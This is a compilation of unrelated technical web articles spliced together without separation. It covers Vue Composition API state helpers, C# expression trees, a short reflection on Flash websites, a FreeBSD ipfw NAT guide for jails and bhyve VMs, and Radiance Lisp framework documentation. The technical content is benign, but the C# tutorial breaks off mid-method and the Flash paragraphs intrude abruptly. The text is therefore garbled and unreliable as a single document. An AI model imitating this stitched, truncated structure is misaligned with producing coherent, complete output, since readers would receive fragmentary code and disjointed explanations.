<p>Some things here might seem odd. <code>computed</code> gets imported, <code>ref</code> and why<code>name.value</code>? Isn't that going to be annoying? It would be out of scope for this article, so I better point you to a source that explains all of this much better than I could: <a href="https://composition-api.vuejs.org/api.html" rel="nofollow">composition-api.vuejs.org</a> is the place to go! There are also great courses on <a href="https://vuemastery.com/" rel="nofollow">VueMastery</a>.</p>

<p>Back to topic: The cool new thing now is that we can group concerns. Instead of putting each puzzle piece somewhere else (that is variables in data, reactive properties in computed and methods in methods) we can create everything grouped next to each other. What makes it even better is that thanks to the global imports, every piece can be split out into separate functions:</p>

<pre><code>// Afraid of becoming React dev? Maybe call it 'hasGreeting' then.
function useGreeting () {
  const name = ref('World')
  const hello = computed(() =&gt; `Hello ${name.value}`)
  return { name, hello }
}

function useCounting () {
  const count = ref(0)
  const countUp = () =&gt; count.value = count.value + 1
  return { count, countUp }
}

const component = defineComponent({
  setup () {
    const { name, hello } = useGreeting()
    const { count: clicks, countUp } = useCounting()
    return { name, hello, clicks, countUp }
  }
}  
</code></pre>

<p>This works the same way and it works with everything, including computed properties, watchers and hooks. It makes it also very clear where everything is coming from, unlike mixins. You can play around with this example in this <a href="https://codesandbox.io/s/vue3-playground-lf16m?file=/src/index.js" rel="nofollow">Code Sandbox</a> I made.</p>

<h2 id="minimalist-but-convenient-state-handling">Minimalist but convenient state handling</h2>

<p>While looking at the Composition API I thought about how it could be nice for simple and declarative state handling. Assuming I have somehow name-spaced state collections and actions, a bit like we know from Vuex, for example:</p>

<pre><code>import { ref } from 'vue'

// using 'ref' here because we want to return the properties directly
// otherwise 'reactive' could be used
export const state = {
  name: ref('World'),
  clicks: ref(0)
}

export const actions = {
  'name/change': (name, newName) =&gt; {
    name.value = newName
  },
  'clicks/countUp': (clicks) =&gt; {
    clicks.value++
  }
}
</code></pre>

<p>Now this is a very simplified example of course but it should illustrate the idea. This could be used directly and the Composition API makes it not too inconvenient alread. Unfortunately it is not exactly beautiful to write (yet):</p>

<pre><code>import { state, actions } from '@/state'

defineComponent({
  setup () {
    return {
      name: state.name,
      clicks: state.clicks,
      // brrr, not pretty
      changeName (newName) { actions['name/change'](state.name, newName) }
      countUp () { actions['clicks/countUp'](state.clicks) }
    }
  }
})
</code></pre>

<p>To make this not only prettier but also less verbose, a helper can be introduced. The goal is to have something like this:</p>

<pre><code>import { useState } from '@/state'

defineComponent({
  setup () {
    const { collection: name, actions: nameActions } = useState('name')
    const { collection: clicks, actions: clickActions } = useState('clicks')

    return {
      name,
      clicks,
      changeName: nameActions.change
      countUp: clickActions.countUp
    }
  }
})
</code></pre>

<p>Much nicer! And not too hard to build! Lets have a look at the useState source code:</p>

<pre><code>function useState (prop) {
  // assumes available state object with properties
  // of type Ref, eg const state = { things: ref([]) }
  const collection = state[prop]

  // assumes available stateActions object with properties
  // in the form 'things/add': function(collection, payload)
  const actions = Object.keys(stateActions).reduce((acc, key) =&gt; {
    if (key.startsWith(`${prop}/`)) {
      const newKey = key.slice(prop.length + 1) // extracts action name
      acc[newKey] = payload =&gt; stateActions[key](collection, payload)
    }
    return acc
  }, {})

  return { collection, actions }
}
</code></pre>

<p>Just ten lines and it makes life so much easier! This returns the collection reference and maps all actions accordingly. For the sake of completeness here a full example with state and stateActions:</p>

<pre><code>import { ref } from 'vue'

// not using reactive here to be able to send properties directly
const state = {
  count: ref(0),
  name: ref('World')
}

const stateActions = {

  'count/increase' (countRef) {
    countRef.value++
  },
  'count/decrease' (countRef) {
    countRef.value--
  },

  'name/change' (nameRef, newName) {
    nameRef.value = newName
  }

}

function useState (prop) { /* ... */ }
</code></pre>

<p>Now <code>useState('count')</code> would return the reference state.count and an object with the actions increase and decrease:</p>

<pre><code>import { useState } from '@/state'

defineComponent({
  setup () {
    const { collection: count, actions: countActions } = useState('count')
    return {
      count,
      countUp: countActions.increase
    }
  }
})
</code></pre>

<p>This works well for me and happened to be very convenient already. Maybe I'll make a package out of it. What are your opinions on this?</p>

<p>Expression trees is an obscure, although very interesting feature in .NET. Most people probably think of it as something synonymous with object-relational mapping frameworks, but despite being its most common use case, it’s not the only one. There are a lot of creative things you can do with expression trees, including code generation, transpilation, metaprogramming, and more.</p>
<p>In this article I will give an overview of what expression trees are and how to work with them, as well as show some interesting scenarios where I’ve seen them used to great effect.</p>
<h2>What is an expression tree?</h2>
<p>When it comes to programming languages, an expression describes some operation on data that produces a certain result. It’s one of the foundational constructs of any language.</p>
<p>As an example of a very simple expression, consider <code>2 + 3</code>. It consists of a constant, a plus operator, and another constant. We can evaluate this expression and get the result, which is <code>5</code>.</p>
<p>Of course, expressions vary in complexity and can contain different combinations of constants, variables, operators and function calls. For example, the following piece of code is also an expression:</p>
<div data-language="csharp"><pre><code><span>!</span><span>string</span><span>.</span><span>IsNullOrWhiteSpace</span><span>(</span>personName<span>)</span>
    <span>?</span> <span>"Greetings, "</span> <span>+</span> personName
    <span>:</span> <span>null</span><span>;</span></code></pre></div>
<p>Looking at the above expression, we can also consider two of its aspects: <strong>what it does</strong> and <strong>how it does it</strong>.</p>
<p>When it comes to the former, the answer is pretty simple — it generates a greeting based on the person’s name, or produces a <code>null</code>. If this expression was returned by a function, that would be the extent of information we could derive from its signature:</p>
<div data-language="csharp"><pre><code><span>string</span><span>?</span> <span>GetGreeting</span><span>(</span><span>string</span> personName<span>)</span> <span>{</span>  <span>}</span></code></pre></div>
<p>As for how it does it, however, the answer is a bit more detailed. This expression consists of a ternary conditional operator, whose condition is evaluated by negating the result of a call to method <code>string.IsNullOrWhiteSpace</code> with parameter <code>personName</code>, whose positive clause is made up of a “plus” binary operator that works with a constant string expression <code>"Greetings, "</code> and the parameter expression, and whose negative clause consist of a sole <code>null</code> expression.</p>
<p>The description above may seem like a mouthful, but it outlines the exact syntactic structure of the expression. It is by this higher-order representation that we’re able to tell how exactly it’s evaluated.</p>
<p>To make things more clear, we can also illustrate this representation with the following diagram:</p>
<div data-language="csharp"><pre><code> <span>{</span> <span>Ternary</span> conditional <span>}</span>
      <span>|</span>      <span>|</span>     <span>|</span>
    <span>+</span><span>-</span><span>+</span>      <span>|</span>     <span>+</span><span>--</span><span>--</span><span>-</span><span>+</span>
    <span>|</span>        <span>|</span>           <span>|</span>
 <span>(</span><span>true</span><span>)</span>   <span>(</span><span>false</span><span>)</span>   <span>(</span>condition<span>)</span>
    <span>|</span>        <span>|</span>           <span>|</span>
    <span>|</span>        <span>|</span>           <span>+</span><span>--</span><span>--</span> <span>{</span> <span>(</span><span>!</span><span>)</span> <span>}</span>
    <span>|</span>        <span>+</span><span>--</span><span>--</span><span>--</span><span>+</span>             <span>|</span>
 <span>{</span> <span>(</span><span>+</span><span>)</span> <span>}</span>            <span>|</span>             <span>|</span>
   <span>|</span> <span>|</span>           <span>{</span> <span>null</span> <span>}</span>   <span>{</span> <span>Method</span> call <span>}</span>
   <span>|</span> <span>|</span>                         <span>|</span>      <span>|</span>
   <span>|</span> <span>+</span><span>--</span><span>--</span><span>--</span><span>--</span><span>-</span><span>+</span>               <span>|</span>      <span>|</span>
   <span>|</span>           <span>|</span>               <span>|</span>      <span>+</span><span>--</span><span>--</span><span>--</span><span>-</span> <span>{</span> <span>string</span><span>.</span>IsNullOrWhiteSpace <span>}</span>
   <span>|</span>           <span>|</span>               <span>|</span>
   <span>|</span>     <span>{</span> personName <span>}</span>        <span>+</span><span>--</span><span>--</span><span>--</span><span>--</span> <span>{</span> personName <span>}</span>
   <span>|</span>
   <span>+</span><span>--</span><span>--</span> <span>{</span> <span>"Greetings, "</span> <span>}</span></code></pre></div>
<p>As you can see, at the highest level we have the ternary conditional operator which is itself made up of other expressions, which are made up of other expressions, and so on. The relationship between individual components is hierarchical, resembling an upside-down tree.</p>
<p>Although it’s inherently obvious to us as humans, in order to interpret this representation programmatically, we need a special data structure. This data structure is what we call an <em>expression tree</em>.</p>
<h2>Constructing expression trees manually</h2>
<p>In C#, expression trees can be used in either of two directions: we can create them directly via an API and then compile them into runtime instructions, or we can disassemble them from supplied lambda expressions. In this part of the article we will focus on the first one.</p>
<p>The framework offers us with an API to construct expression trees through the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.linq.expressions.expression"><code>Expression</code></a> class located in the <code>System.Linq.Expressions</code> namespace. It exposes various factory methods that can be used to produce expressions of different types.</p>
<p>Some of these methods are:</p>
<ul>
<li><code>Expression.Constant(...)</code> — creates an expression that represents a value.</li>
<li><code>Expression.Variable(...)</code> — creates an expression that represents a variable.</li>
<li><code>Expression.New(...)</code> — creates an expression that represents an initialization of a new instance.</li>
<li><code>Expression.Assign(...)</code> — creates an expression that represents an assignment operation.</li>
<li><code>Expression.Equal(...)</code> — creates an expression that represents an equality comparison.</li>
<li><code>Expression.Call(...)</code> — creates an expression that represents a specific method call.</li>
<li><code>Expression.Condition(...)</code> — creates an expression that represents branching logic.</li>
<li><code>Expression.Loop(...)</code> — creates an expression that represents repeating logic.</li>
</ul>
<p>As a simple exercise, let’s recreate the expression we’ve looked into in the previous part of the article:</p>
<div data-language="csharp"><pre><code><span>public</span> <span>Expression</span> <span>ConstructGreetingExpression</span><span>(</span><span>)</span>
<span>{</span>
    <span>var</span> personNameParameter <span>=</span> Expression<span>.</span><span>Parameter</span><span>(</span><span>typeof</span><span>(</span><span>string</span><span>)</span><span>,</span> <span>"personName"</span><span>)</span><span>;</span>

    
    <span>var</span> isNullOrWhiteSpaceMethod <span>=</span> <span>typeof</span><span>(</span><span>string</span><span>)</span>
        <span>.</span><span>GetMethod</span><span>(</span><span>nameof</span><span>(</span><span>string</span><span>.</span>IsNullOrWhiteSpace<span>)</span><span>)</span><span>;</span>

    <span>var</span> condition <span>=</span> Expression<span>.</span><span>Not</span><span>(</span>
        Expression<span>.</span><span>Call</span><span>(</span>isNullOrWhiteSpaceMethod<span>,</span> personNameParameter<span>)</span><span>)</span><span>;</span>

    
    <span>var</span> trueClause <span>=</span> Expression<span>.</span><span>Add</span><span>(</span>
        Expression<span>.</span><span>Constant</span><span>(</span><span>"Greetings, "</span><span>)</span><span>,</span>
        personNameParameter<span>)</span><span>;</span>

    
    <span>var</span> falseClause <span>=</span> Expression<span>.</span><span>Constant</span><span>(</span><span>null</span><span>,</span> <span>typeof</span><span>(</span><span>string</span><span>)</span><span>)</span><span>;</span>

    
    <span>return</span> Expression<span>.</span><span>Condition</span><span>(</span>condition<span>,</span> trueClause<span>,</span> falseClause<span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>Let’s digest what just happened here.</p>
<p>First of all, we’re calling <code>Expression.Parameter</code> in order to construct a parameter expression. We will be able to use it to resolve the value of a particular parameter.</p>
<p>Following that, we are relying on reflection to resolve a reference to the <code>string.IsNullOrWhiteSpace</code> method. We use <code>Expression.Call</code> to create a method invocation expression that represents a call to <code>string.IsNullOrWhiteSpace</code> with the parameter resolved by the expression we created earlier. To perform a logical “not” operation on the result, we’re calling <code>Expression.Not</code> to wrap the method call. Incidentally, this expression constitutes the condition part of the ternary expression we’re building.</p>
<p>To compose the positive clause, we’re constructing an “add” operation with the help of <code>Expression.Add</code>. As the operands, we’re providing a constant expression for string <code>"Greetings, "</code> and the parameter expression from earlier.</p>
<p>Then, for the negative clause, we’re using <code>Expression.Constant</code> to create a <code>null</code> constant expression. To ensure that the <code>null</code> value is typed correctly, we explicitly specify the type as the second parameter.</p>
<p>Finally, we’re combining all of the above parts together to create our ternary conditional operator. If you take a moment to trace what goes into <code>Expression.Condition</code>, you will realize that we have essentially replicated the tree diagram we’ve seen earlier.</p>
<p>However, this expression isn’t particularly useful on its own. Since we’ve created it ourselves, we’re not really interested in its structure — we want to be able to evaluate it instead.</p>
<p>In order to do that, we have to create an entry point by wrapping everything in a lambda expression. To turn it into an actual lambda, we can call <code>Compile</code> which will produce a delegate that we can invoke.</p>
<p>Let’s update the method accordingly:</p>
<div data-language="csharp"><pre><code><span>public</span> Func<span>&lt;</span><span>string</span><span>,</span> <span>string</span><span>?</span><span>&gt;</span> <span>ConstructGreetingFunction</span><span>(</span><span>)</span>
<span>{</span>
    <span>var</span> personNameParameter <span>=</span> Expression<span>.</span><span>Parameter</span><span>(</span><span>typeof</span><span>(</span><span>string</span><span>)</span><span>,</span> <span>"personName"</span><span>)</span><span>;</span>

    
    <span>var</span> isNullOrWhiteSpaceMethod <span>=</span> <span>typeof</span><span>(</span><span>string</span><span>)</span>
        <span>.</span><span>GetMethod</span><span>(</span><span>nameof</span><span>(</span><span>string</span><span>.</span>IsNullOrWhiteSpace<span>)</span><span>)</span><span>;</span>

    <span>var</span> condition <span>=</span> Expression<span>.</span><span>Not</span><span>(</span>
        Expression<span>.</span><span>Call</span><span>(</span>isNullOrWhiteSpaceMethod<span>,</span> personNameParameter<span>)</span><span>)</span><span>;</span>

    
    <span>var</span> trueClause <span>=</span> Expression<span>.</span><span>Add</span><span>(</span>
        Expression<span>.</span><span>Constant</span><span>(</span><span>"Greetings, "</span><span>)</span><span>,</span>
        personNameParameter<span>)</span><span>;</span>

    
    <span>var</span> falseClause <span>=</span> Expression<span>.</span><span>Constant</span><span>(</span><span>null</span><span>,</span> <span>typeof</span><span>(</span><span>string</span><span>)</span><span>)</span><span>;</span>

    <span>var</span> conditional <span>=</span> Expression<span>.</span><span>Condition</span><span>(</span>condition<span>,</span> trueClause<span>,</span> falseClause<span>)</span><span>;</span>

    <span>var</span> lambda <span>=</span> Expression<span>.</span>Lambda<span>&lt;</span>Func<span>&lt;</span><span>string</span><span>,</span> <span>string</span><span>?</span><span>&gt;&gt;</span><span>(</span>conditional<span>,</span> personNameParameter<span>)</span><span>;</span>

    <span>return</span> lambda<span>.</span><span>Compile</span><span>(</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>As you can see, we were able to construct a lambda expression by specifying its body (which is our conditional expression) and the parameter that we defined earlier. We also indicated the exact type of the function this expression represents by supplying a generic argument.</p>
<p>By compiling the expression tree, we can convert the code it represents into runtime instructions. The delegate returned by this method can be used to evaluate the expression:</p>
<div data-language="csharp"><pre><code><span>var</span> getGreeting <span>=</span> <span>ConstructGreetingFunction</span><span>(</span><span>)</span><span>;</span>

<span>var</span> greetingForJohn <span>=</span> <span>getGreeting</span><span>(</span><span>"John"</span><span>)</span><span>;</span></code></pre></div>
<p>However, if we try to run this, we will get an error:</p>
<div data-language="ini"><pre><code>The binary operator Add is not defined for the types 'System.String' and 'System.String'.</code></pre></div>
<p>Hmm, that’s weird. I’m pretty sure the <code>+</code> operator is defined for strings, otherwise how else would I be able to write <code>"foo" + "bar"</code>?</p>
<p>Well, actually the error message is correct, this operator is indeed not defined for <code>System.String</code>. Instead what happens is that the C# compiler automatically converts expressions like <code>"foo" + "bar"</code> into <code>string.Concat("foo", "bar")</code>. In cases with more than two strings this provides better performance because it avoids unnecessary allocations.</p>
<p>When dealing with expression trees, we’re essentially writing the “final” version of the code. So instead of <code>Expression.Add</code> we need to call <code>string.Concat</code> directly.</p>
<p>Let’s change our code to accommodate for that:</p>
<div data-language="csharp"><pre><code><span>public</span> Func<span>&lt;</span><span>string</span><span>,</span> <span>string</span><span>?</span><span>&gt;</span> <span>ConstructGreetingFunction</span><span>(</span><span>)</span>
<span>{</span>
    <span>var</span> personNameParameter <span>=</span> Expression<span>.</span><span>Parameter</span><span>(</span><span>typeof</span><span>(</span><span>string</span><span>)</span><span>,</span> <span>"personName"</span><span>)</span><span>;</span>

          <p>Now it’s abandoned, but a lot of websites were built on FLASH technologies.</p>
          <p>Basic HTML technologies didn’t provide enough tools and methods for designers to express their ideas and FLASH which was used commonly to create an animation and interactive presentations stepped into the Web.</p>
          <p>For designers who wanted to do web — FLASH websites were the breath of fresh air. Everything you can imagine was possible — from complex interactive animations to 3D.</p>
          <p>The main source of inspiration was thefwa.com and it was an honor to add an FWA label on a website.</p>
          <p>Sounds good, right? But what happened with FLASH then? Well, briefly it wasn’t secure, it was heavy to load, Apple effect and HTML5.</p>
          <p>Unfortunately, I can’t provide any links to you, because you can’t open them, FLASH technology is deadly dead right now.</p>
          <p>It’s hard to imagine right now but FLASH was a big part of the internet not so far ago — websites, games, banners and I think that more than 50% of all designers portfolio was built on FLASH.</p>

		<p>Most of the time, I want to do some throw away networking temporally to play
with something or to try something out. I really don't like changing all the
config on a machine just to try something. The FreeBSD documentation leans the
other way first showing you what to edit in rc.conf before maybe mentioning
that actual commands to run. </p>
<p>The ipfw documentation has a different problem. The example in the handbook and
online are both very verbose and very complicated. Because ipfw is normally
configured with a shell script the authors go absolutely wild with all the
features they can.</p>
<p>I had a hard time figuring out ipfw in-kernel NAT from these guides. Instead
here I present the simplest set of commands I could find to set up a NAT and a
little explanation to help you debug when it doesn't work.</p>
<p>This is based on a great email from <a href="https://lists.freebsd.org/pipermail/freebsd-virtualization/2014-October/002998.html">Allan Jude</a> on the
freebsd-virtualization list from 2014 that laid out the basics of this setup. </p>
<h2 id="set-up-overview">Set up Overview</h2>
<p>For testing I want to run virtual machines and vnet jails on my laptop and give
them have access to the internet. I want a throw away NAT setup that is ready
to go quickly.</p>
<p>My laptop connects to my home network (and eventually the internet) over wifi.
The wifi network offers me an address in the 192.168.1.0/24 subnet. On my
laptop I want to have multiple guests. To do this we are going to use ipfw NAT
and a bridge interface. It will look something like this:</p>
<pre><code>         TO INTERNET

</code></pre><p>The interfaces in the jails (the b half of the epair) and the virtual machines
(the vtnet in the V) won't be visible to ipfw, but will exist in their own
world. To work around this we will use a bridge with the epairs and tap
interfaces.</p>
<h2 id="setting-up-ipfw-nat">Setting up ipfw NAT</h2>
<p>We need to load the kernel modules for ipfw and the ipfw in kernel NAT. ipfw
has the frustrating default (and annoyingly different to ipf and pf) of to
dening all traffic. This default has the great property of locking you out of a
machine you are setting up remotely.</p>
<p>This is control by a sysctl that cannot be changed at run time, but we can
change the default behaviour with kenv before we load the module:</p>
<pre><code># kenv net.inet.ip.fw.default_to_accept=1
</code></pre><p>Now we can safely load ipfw and the in-kernel NAT. </p>
<pre><code># kldload ipfw ipfw_nat
</code></pre><p>ipfw should load enabled, if you are having trouble later on double check that
the firewall is actually enabled.</p>
<pre><code># sysctl net.inet.ip.fw.enable
net.inet.ip.fw.enable: 1
</code></pre><p>When we do NAT we are acting as a gateway between the traffic on the NATd
interface and the real interface. For any packets to be passed we need to
enable forwarding.</p>
<pre><code># sysctl net.inet.ip.forwarding=1
# sysctl net.inet6.ip6.forwarding=1
</code></pre><h2 id="ipfw-rule-set">ipfw rule set</h2>
<p>We need to create an IPFW NAT instance configured with the interface we want to
NAT (wlan0 in this case) and configure rules to pass all traffic from the
bridge through the NAT.</p>
<pre><code># ipfw nat 1 config if wlan0
# ipfw add 101 nat 1 ip from 10.0.4.0/24 to any out via wlan0
# ipfw add 103 nat 1 ip from any to any in via wlan0
</code></pre><p>I like to leave a gap between rules like this so I can insert an ipfw log
command for the eventual case that nothing makes sense and everything is
broken.</p>
<h2 id="set-up-interfaces">set up interfaces</h2>
<p>A bridge is the center of our guest network, we will give it the default root
address that all of our guests will speak to.</p>
<pre><code># ifconfig bridge create
bridge0
# ifconfig bridge0 inet 10.0.4.1/24 up
</code></pre><p>Our jail will use an epair interface to speak to the outside world. They come
as an a and a b part, ifconfig only tells us about the a part when it clones
the interface. When we give a vnet jail an interface it is no longer visible to
the host system. An epair gives us two interfaces that act like a virtual
ethernet cable, we stick one end into the jail and the other is connected to
the bridge.</p>
<pre><code># ifconfig epair create
epair0a
</code></pre><p>Our virtual machine will use a tap interface to access the world. The tap
interface needs to be brought up. There is a helpful sysctl that is off by
default which will trigger the interface to be brought up when it is first
opened. I like to set this to one, otherwise I find myself debugging networking
inside the VM alot with little success.</p>
<pre><code># ifconfig tap create
tap0
# sysctl net.link.tap.up_on_open=1
</code></pre><p>With all the interfaces set up we need to add them to our bridge.</p>
<pre><code># ifconfig bridge0 addm epair0a addm tap0
</code></pre><h2 id="create-jail">Create jail</h2>
<p>Never spoken about is the bsdinstall jail command. It takes a directory and
installs a jail into it. This command will ask you some questions, it would be
cool if it didn't, that would make automating jail creation in scripts much
easier for me.</p>
<pre><code># mkdir testjail
# bsdinstall jail testjail
</code></pre><p>We make our jail persist so it will stick around as we experiment. The
following command creates the jail on the host:</p>
<pre><code># jail -c name=testjail persist vnet path=testjail vnet.interface=epair0b 
</code></pre><p>Now we can jexec into the jail and configure the epair. When you bring one end
of an epair up, the other end comes up, when it goes down the other end goes
down. We just need to configure an address and a default route in our jail.</p>
<pre><code># jexec testjail sh
[testjail] # ifconfig epair0b inet 10.0.4.4/24 up
[testjail] # route add default 10.0.4.1
[testjail] # ping -c 1 10.0.4.1
[testjail] # ping -c 1 192.168.1.1
[testjail] # ping -c 1 8.8.8.8
</code></pre><p>With this setup the jail can speak to our bridge, the local network and the
wider Internet.</p>
<h2 id="create-and-config-a-vm">Create and config a VM</h2>
<p>The FreeBSD offers prebuilt virtual machine images, The latest current one is
available from a url like this:</p>
<pre><code># fetch ftp://ftp.freebsd.org/pub/FreeBSD/snapshots/VM-IMAGES/13.0-CURRENT/amd64/Latest/FreeBSD-13.0-CURRENT-amd64.raw.xz
</code></pre><p>It would be cool if there was a latest symlink that gave you a new head VM from
one static place. The image comes xz compressed, we need to unpack it and I
like to move it to a consistent place:</p>
<pre><code># xz -d FreeBSD-13.0-CURRENT-amd64.raw.xz
# mv FreeBSD-13.0-CURRENT-amd64.raw /vms/freebsd-current
</code></pre><p>bhyve requires we load the vmm kernel module, with that we can use the
excellent vmrun.sh script to launch our vm.</p>
<pre><code># kldload vmm
# sh /usr/share/examples/bhyve/vmrun.sh -c 4 -m 1024 -t tap0 -d /vms/freebsd-current freebsd-current
</code></pre><p>Once that comes up you can log in and do some manual config.</p>
<pre><code>[vm] # ifconfig vtnet0 inet 10.0.4.5/24 up
[vm] # route add default 10.0.4.1
[vm] # ping 8.8.8.8
</code></pre><p>For DNS in both the jail and the virtual machines I have to manually set up the
name server local from my network.</p>
<p>/etc/resolv.conf</p>
<pre><code>search lan
nameserver 192.168.1.1
</code></pre><p>This won't be valid as I move to other networks, but I am sure I will remember
after only a little confusion and debugging.</p>
<h2 id="conclusion">Conclusion</h2>
<p>That is all it takes. The NAT configuration is 3 firewall rules and enabling
forwarding. None of this is persistent and that isn't great practice for a
production environment, but it you just want to experiment with ipfw and NAT,
or spin up a VM for today knowing how to do this in a non-persistent way is
really helpful.</p>

It should let you write personal websites and generally deployable applications easily and in such a way that they can be used on practically any setup without having to undergo special adaptations.</p> <h2 id="getting_it">Getting It</h2> <p>Radiance and associated modules and applications are distributed via Quicklisp in a separate dist. To install Radiance, do:</p> <pre><code>(ql-dist:install-dist "http://dist.tymoon.eu/shirakumo.txt")
(ql:quickload :radiance)
</code></pre> <p>From there on out you should be able to load and use any kind of Radiance module like <a href="https://github.com/Shirakumo/purplish">Purplish</a> directly via Quicklisp's <code>quickload</code>.</p> <h2 id="a_lengthy_and_in-depth_example">A Lengthy and In-Depth Example</h2> <p>You can find a tutorial that introduces Radiance and most of the important concepts, and explores how to write a web application in general, <a href="https://github.com/Shirakumo/radiance-tutorial/blob/master/Part%200.md">here</a>. It should give you a good feeling for how to go about things, and give you pointers about where to look if you need a particular feature. In the last part it'll also go into the actual setup and deployment of a Radiance installation on a production server.</p> <h2 id="a_simple_example">A Simple Example</h2> <p>The most basic thing you most likely want to do is serve some kind of HTML. So let's work towards that and gradually extend it. Before we can begin, we need to start up Radiance.</p> <pre><code>(ql:quickload :radiance)
(<a href="#FUNCTION%20RADIANCE-CORE%3ASTARTUP">radiance:startup</a>)</code></pre> <p>If this is your first time setting up Radiance, you'll get a note about it using the <code>r-welcome</code> module. It should also give you a link that you can open in your browser to see a little greeting page. For now we'll just want to put up our own little page alongside it.</p> <pre><code>(<a href="http://l1sp.org/cl/in-package">in-package</a> :rad-user)

(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (setf (<a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3A%28SETF%20CONTENT-TYPE%29">content-type</a> <a href="#VARIABLE%20RADIANCE-CORE%3A%2ARESPONSE%2A">*response*</a>) "text/plain") 
  "Hi!")</code></pre> <p>Visiting <a href="http://localhost:8080/example">localhost:8080/example</a> should now just show "Hi". Rather boring indeed. So let's spit out some HTML instead. For now, we'll use <a href="http://weitz.de/cl-who/">cl-who</a> since it is very simple.</p> <pre><code>(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (cl-who:with-html-output-to-string (o)
    (cl-who:htm
     (:html
      (:head (:title "Example Page"))
      (:body (:header (:h1 "Couldn't Be Simpler."))
             (:main (:p "Trust me on this one.")))))))</code></pre> <p>A recompile and refresh later and we have some font styling going on. Next we'll probably want to add a CSS file to it to style it properly. We could serve the CSS using another page as well, but that isn't the best way to go about things in the long term.</p> <p>Let's instead look at how to create a module, which will allow us to organise things in a more orderly fashion. You can create the files for a module manually, but for now we'll settle with an automatically generated skeleton that Radiance can provide you with.</p> <pre><code>(<a href="#FUNCTION%20RADIANCE-CORE%3ACREATE-MODULE">create-module</a> "example")</code></pre> <p>It should return you a path on which the module resides. It should contain an ASDF system, a main lisp file, and two folders, <code><a href="#URI-DISPATCHER%20RADIANCE-CORE%3ASTATIC">static</a></code> and <code>template</code>. Surprisingly enough, the <code><a href="#URI-DISPATCHER%20RADIANCE-CORE%3ASTATIC">static</a></code> folder is where statically served files go, and <code>template</code> is for template documents, if you happen to use a template system.</p> <p>Let's open up the <code>example.lisp</code> and carry over our example page from it.</p> <pre><code>(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (cl-who:with-html-output-to-string (o)
    (cl-who:htm
     (:html
      (:head (:title "Example Page"))
      (:body (:header (:h1 "Couldn't Be Simpler."))
             (:main (:p "Trust me on this one.")))))))</code></pre> <p>Pages are identified by a name symbol. Since we now have our own module, and thus our own package, the example symbol above won't be the same as the one we've used before. We'll just have to remove the page in the <code>rad-user</code> package to avoid the clash.</p> <pre><code>(<a href="#FUNCTION%20RADIANCE-CORE%3AREMOVE-PAGE">remove-page</a> 'rad-user::example)</code></pre> <p>Next let's create a simple CSS file to spruce things up a little. The file will be <code>example.css</code> placed in the <code><a href="#URI-DISPATCHER%20RADIANCE-CORE%3ASTATIC">static</a></code> folder. Here's a sample CSS if you don't want to write your own.</p> <pre><code>body{
    font-family: sans-serif;
    font-size: 12pt;
    background: #EEE;
}

header{
    text-align: center;
}

main{
    width: 800px;
    margin: 0 auto 0 auto;
    background: #FFF;
    padding: 10px;
    border: 1px solid #BBB;
    border-radius: 5px;
}</code></pre> <p>Next we need to modify our HTML to actually link to the style sheet. In order to get the address to the stylesheet we'll have to make use of Radiance's routing system. Don't worry though, it's not much of a hassle.</p> <pre><code>(<a href="#MACRO-FUNCTION%20RADIANCE-CORE%3ADEFINE-PAGE">define-page</a> example "/example" ()
  (cl-who:with-html-output-to-string (o)
    (cl-who:htm
     (:html
      (:head (:title "Example Page")
             (:link :rel "stylesheet" :type "text/css" 
                    :href (<a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a> "/static/example/example.css" :representation :external)))
      (:body (:header (:h1 "Couldn't Be Simpler."))
             (:main (:p "Trust me on this one.")))))))</code></pre> <p>Refresh the page, and voilà, now it's got some pizzazz to it too. You'll probably want an explanation for the whole <code><a href="#FUNCTION%20RADIANCE-CORE%3AURI-TO-URL">uri-to-url</a></code> business. Explaining it in full is handled by the sections following this one, but the gist of it is that it ensures that the link to the static file is properly resolved under any setup.</p> <h2 id="1._radiance_concepts_&amp;_parts">1. Radiance Concepts &amp; Parts</h2> <h3 id="1.1_uri">1.1 URI</h3> <p>One of the most central concepts in Radiance is that of a URI. A URI is an object that consists of a list of domains, an optional port number, and a path (see <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3AURI">uri</a></code>). It is essentially a stripped down version of a general URI, and as such doesn't include a schema, query, or fragment part. Another important difference is that the <code><a href="#GENERIC-FUNCTION%20RADIANCE-CORE%3ADOMAINS">domains</a></code> URIs are used at several points throughout the framework, both to capture locations and to handle dispatch matching.</p> <p>Note that URIs are mutable. This is important for performance, as URI modifications have to happen in several parts that lie on the critical path. However, in the usual case it is not expected that URIs are modified outside of a few select functions. Modifying a URI's parts in unexpected ways may lead to strange behaviour.</p> <p>URIs have a unique string representation and can be serialised to string and parsed back into a full URI object again. URIs can also be dumped to FASL files as literals, so emitting them from macros is fine. The syntax for a URI is as follows:</p> <pre><code>URI     ::= DOMAINS? (':' PORT)? '/' PATH?
DOMAINS ::= DOMAIN ('.' DOMAIN)*
DOMAIN  ::= ('a'..'Z' | '0'..'9' | '-')
PORT    ::= ('0'..'9'){1, 5}
